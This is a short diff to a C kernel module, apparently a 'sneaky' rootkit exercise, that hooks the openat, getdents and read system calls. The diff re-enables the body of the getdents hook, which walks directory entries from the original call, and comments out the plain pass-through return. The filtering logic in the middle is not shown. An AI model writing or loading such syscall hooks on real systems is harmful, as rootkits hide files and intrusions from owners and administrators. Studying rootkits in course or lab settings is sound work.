@@ -56,7 +56,6 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 // int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 // DI, SI, DX
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
-    /*
     struct linux_dirent *d;
     int nread = original_getdents((unsigned int)regs->di, (struct linux_dirent *)regs->si, (unsigned int)regs->dx);
 
@@ -77,8 +76,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
         bpos += d->d_reclen;
     }
     return nread;
-    */
-    return (*original_getdents)(regs);
+    //return (*original_getdents)(regs);
 }
 
 // ssize_t read(int fd, void *buf, size_t count);
